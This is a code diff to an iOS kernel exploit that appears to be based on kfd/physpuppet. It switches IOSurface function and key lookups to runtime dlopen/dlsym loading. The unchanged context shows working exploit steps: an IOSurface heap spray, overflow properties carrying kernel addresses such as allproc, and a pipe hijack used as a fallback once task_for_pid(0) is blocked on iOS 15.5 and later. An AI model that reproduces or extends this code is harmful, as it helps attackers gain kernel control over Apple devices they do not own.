@@ -36,7 +36,56 @@ extern kern_return_t mach_vm_write(vm_map_t, mach_vm_address_t, vm_offset_t, mac
 extern kern_return_t mach_vm_deallocate(vm_map_t, mach_vm_address_t, mach_vm_size_t);
 #include <IOKit/IOKitLib.h>
 #include <CoreFoundation/CoreFoundation.h>
-#include <IOSurface/IOSurfaceRef.h>
+#include <dlfcn.h>
+
+// 运行时动态加载 IOSurface 符号（避免链接时依赖）
+typedef CFTypeRef  IOSurfaceRef;
+typedef uint32_t   IOSurfaceID;
+
+typedef IOSurfaceRef (*IOSurfaceCreateFunc)(CFDictionaryRef properties);
+typedef IOSurfaceID   (*IOSurfaceGetIDFunc)(IOSurfaceRef surface);
+typedef void          (*IOSurfaceSetValueFunc)(IOSurfaceRef surface, CFStringRef key, CFTypeRef value);
+
+static IOSurfaceCreateFunc   p_IOSurfaceCreate   = NULL;
+static IOSurfaceGetIDFunc    p_IOSurfaceGetID    = NULL;
+static IOSurfaceSetValueFunc p_IOSurfaceSetValue  = NULL;
+
+// IOSurface 属性键（运行时从 CoreFoundation 常量获取）
+static CFStringRef g_kIOSurfaceWidth         = NULL;
+static CFStringRef g_kIOSurfaceHeight        = NULL;
+static CFStringRef g_kIOSurfaceBytesPerRow   = NULL;
+static CFStringRef g_kIOSurfaceBytesPerElement = NULL;
+static CFStringRef g_kIOSurfacePixelFormat   = NULL;
+
+// 初始化 iOSurface 动态符号（在 pp_open_client 之前调用一次）
+static int pp_init_symbols(void) {
+    if (p_IOSurfaceCreate) return 0; // 已初始化
+
+    void *handle = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_NOW);
+    if (!handle) {
+        printf("[pp] ❌ dlopen IOSurface.framework 失败: %s\n", dlerror());
+        return -1;
+    }
+
+    p_IOSurfaceCreate  = (IOSurfaceCreateFunc) dlsym(handle, "IOSurfaceCreate");
+    p_IOSurfaceGetID   = (IOSurfaceGetIDFunc)  dlsym(handle, "IOSurfaceGetID");
+    p_IOSurfaceSetValue = (IOSurfaceSetValueFunc)dlsym(handle, "IOSurfaceSetValue");
+
+    if (!p_IOSurfaceCreate || !p_IOSurfaceGetID || !p_IOSurfaceSetValue) {
+        printf("[pp] ❌ dlsym IOSurface 函数失败: %s\n", dlerror());
+        return -1;
+    }
+
+    // 属性键来自 CoreFoundation 常量区 — 用 CFSTR 宏在运行时构造
+    g_kIOSurfaceWidth         = CFSTR("IOSurfaceWidth");
+    g_kIOSurfaceHeight        = CFSTR("IOSurfaceHeight");
+    g_kIOSurfaceBytesPerRow   = CFSTR("IOSurfaceBytesPerRow");
+    g_kIOSurfaceBytesPerElement = CFSTR("IOSurfaceBytesPerElement");
+    g_kIOSurfacePixelFormat   = CFSTR("IOSurfacePixelFormat");
+
+    printf("[pp] ✅ IOSurface 符号已动态加载\n");
+    return 0;
+}
 
 // ================================================================
 // 内部状态
@@ -259,20 +308,20 @@ static uint32_t pp_create_surface(void) {
     CFNumberRef bp = CFNumberCreate(NULL, kCFNumberIntType, &bpp);
     CFNumberRef pf = CFNumberCreate(NULL, kCFNumberIntType, &pixelFormat);
 
-    CFDictionarySetValue(props, kIOSurfaceWidth,        w);
-    CFDictionarySetValue(props, kIOSurfaceHeight,       h);
-    CFDictionarySetValue(props, kIOSurfaceBytesPerRow,  br);
-    CFDictionarySetValue(props, kIOSurfaceBytesPerElement, bp);
-    CFDictionarySetValue(props, kIOSurfacePixelFormat,  pf);
+    CFDictionarySetValue(props, g_kIOSurfaceWidth,        w);
+    CFDictionarySetValue(props, g_kIOSurfaceHeight,       h);
+    CFDictionarySetValue(props, g_kIOSurfaceBytesPerRow,  br);
+    CFDictionarySetValue(props, g_kIOSurfaceBytesPerElement, bp);
+    CFDictionarySetValue(props, g_kIOSurfacePixelFormat,  pf);
 
     CFRelease(w); CFRelease(h); CFRelease(br); CFRelease(bp); CFRelease(pf);
 
-    IOSurfaceRef surf = IOSurfaceCreate(props);
+    IOSurfaceRef surf = p_IOSurfaceCreate(props);
     CFRelease(props);
 
     if (!surf) return 0;
 
-    uint32_t id = IOSurfaceGetID(surf);
+    uint32_t id = p_IOSurfaceGetID(surf);
 
     // 存储引用（防止被释放）
     if (g_pp_count < 256) {
@@ -370,7 +419,7 @@ static int pp_exploit_pipe(void) {
     // 选择倒数第 16 个 surface（给 pipe 前后都留 margin）
     int target_idx = (g_pp_count > 32) ? (g_pp_count - 16) : 0;
     IOSurfaceRef target = g_pp_surfaces[target_idx];
-    uint32_t target_id = IOSurfaceGetID(target);
+    uint32_t target_id = p_IOSurfaceGetID(target);
     printf("[pp] 目标 surface: idx=%d, id=%u\n", target_idx, target_id);
 
     // 计算目标 surface 的内核地址
@@ -397,7 +446,7 @@ static int pp_exploit_pipe(void) {
             memcpy(val_data + 24, &probe_addr, 8);
         }
         CFDataRef value = CFDataCreate(kCFAllocatorDefault, val_data, sizeof(val_data));
-        IOSurfaceSetValue(target, key, value);
+        p_IOSurfaceSetValue(target, key, value);
         CFRelease(key);
         CFRelease(value);
     }
@@ -429,7 +478,7 @@ static int pp_exploit_pipe(void) {
     int n_ids = (g_pp_count < 256) ? g_pp_count : 255;
     for (int i = 0; i < n_ids; i++) {
         if (g_pp_surfaces[i]) {
-            ids[i] = IOSurfaceGetID(g_pp_surfaces[i]);
+            ids[i] = p_IOSurfaceGetID(g_pp_surfaces[i]);
         } else {
             ids[i] = 0;
         }
@@ -497,7 +546,7 @@ static int pp_exploit_pipe(void) {
     // 对所有新 surface 设置溢出属性
     for (int i = (g_pp_count - 32 > 0 ? g_pp_count - 32 : 0); i < g_pp_count; i++) {
         if (!g_pp_surfaces[i]) continue;
-        uint32_t sid = IOSurfaceGetID(g_pp_surfaces[i]);
+        uint32_t sid = p_IOSurfaceGetID(g_pp_surfaces[i]);
         for (int k = 0; k < 120; k++) {
             snprintf(key_buf, sizeof(key_buf), "x_%04d_%04x", i, k);
             CFStringRef key = CFStringCreateWithCString(kCFAllocatorDefault, key_buf, kCFStringEncodingASCII);
@@ -506,7 +555,7 @@ static int pp_exploit_pipe(void) {
             uint64_t mark = g_offs->allproc;
             memcpy(vd + 24, &mark, 8);
             CFDataRef val = CFDataCreate(kCFAllocatorDefault, vd, sizeof(vd));
-            IOSurfaceSetValue(g_pp_surfaces[i], key, val);
+            p_IOSurfaceSetValue(g_pp_surfaces[i], key, val);
             CFRelease(key);
             CFRelease(val);
         }
@@ -649,7 +698,9 @@ int kfd_open(void) {
         printf("[kfd] ===== 切换到 physpuppet 路径 =====\n");
         printf("[kfd] iOS 15.5+ 封锁了 task_for_pid(0)，尝试 IOSurface heap spray + pipe 劫持\n");
 
-        if (pp_open_client() == 0) {
+        if (pp_init_symbols() != 0) {
+            printf("[kfd] ❌ IOSurface 符号加载失败\n");
+        } else if (pp_open_client() == 0) {
             if (pp_spray() > 0) {
                 // 尝试 physpuppet exploit
                 if (pp_exploit_pipe() == 0) {
